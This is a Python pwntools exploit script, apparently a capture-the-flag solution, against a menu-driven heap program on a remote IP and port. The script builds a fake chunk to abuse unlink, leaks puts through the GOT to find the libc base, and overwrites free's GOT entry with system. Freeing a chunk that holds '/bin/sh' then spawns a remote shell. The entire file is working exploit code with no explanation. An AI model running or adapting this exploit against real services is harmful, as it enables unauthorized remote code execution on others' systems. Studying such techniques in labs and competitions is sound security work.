from pwn import *
from LibcSearcher import LibcSearcher
# context.log_level = "debug"

# p = process("./pwn" , {"LD_PRELOAD":"./libc-2.23.so"})
p = remote("43.254.3.203" , 10005)
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")
lo = lambda x,y : log.success(x + " : " + hex(y))
def touch(size):
	p.sendlineafter("chooice :\n" , "1")
	p.sendlineafter("size : \n" , str(size))

def delete(index):
	p.sendlineafter("chooice :\n" , "2")
	p.sendlineafter("delete\n" , str(index))

def show(index):
	p.sendlineafter("chooice :\n" , "3")
	# gdb.attach(p , "b puts")
	p.sendlineafter("show\n" , str(index))
	p.recvuntil("is : \n")
	# raw_input("")
	addr = u64(p.recvuntil("\n")[:-1].ljust(8 , "\x00"))
	return addr

def edit(index , content):
	p.sendlineafter("chooice :\n" , "4")
	p.sendlineafter("modify :\n" , str(index))
	p.recvuntil("content\n")
	p.send(content)
size = 0x90
touch(size) # id 0 
touch(size) # id 1
touch(size) # id 2
touch(size) # id 3 # fake chunk
touch(size) # id 4
touch(size)

# gdb.attach(p , "b puts")
buf = 0x6020C0
# fake_size = 0x90
fake_chunk = p64(0) + p64(size | 1) + p64(buf) + p64(buf + 8)
fake_chunk = fake_chunk.ljust(size , "a")
fake_chunk += p64(size) + p64(size + 0x10) # overwrite prev_size and  p in next_chunk's size
edit(3 , fake_chunk)

delete(4) # unlink
puts_got = elf.got["puts"]
payload = p64(puts_got) 
edit(3 , payload)
puts_addr = show(0)

libc_base = puts_addr - libc.sym["puts"]
## getshell
# # one_gadgets
# one_gadgets = [0x4526a , 0xef6c4 , 0xf0567]
# edit(0 , p64(libc_base + one_gadgets[0]))
# p.interactive()
# # system("/bin/sh\x00") 
system = libc_base + libc.sym["system"]
str_bin_sh = libc_base + libc.search("/bin/sh").next()
free_hook = libc_base + libc.sym["__free_hook"]
free_got = elf.got["free"]
lo("libc_base" , libc_base)
lo("system" , system)
# lo("")
edit(5 , "/bin/sh\x00")
edit(3 , p64(free_got) + p64(str_bin_sh)) 
edit(0 , p64(system))
delete(5)
p.interactive()



